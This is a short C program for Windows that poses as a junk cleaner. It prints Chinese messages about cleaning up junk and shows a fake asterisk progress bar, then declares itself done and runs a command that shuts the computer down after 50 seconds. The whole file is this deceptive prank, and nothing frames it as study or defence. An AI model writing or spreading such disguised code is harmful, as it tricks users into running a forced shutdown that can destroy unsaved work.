#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
int main(int argc, char const *argv[])
{
	int a,s=42;
	printf("正在清理垃圾\n进度条\n");
	system("color 3");
	for(a=0; a<=10; a++)
	{
		printf("%c",s);
		sleep(2);
	}
	system("color 2");
	printf("\n完成!");
	system("shutdown -s -t 50");
}

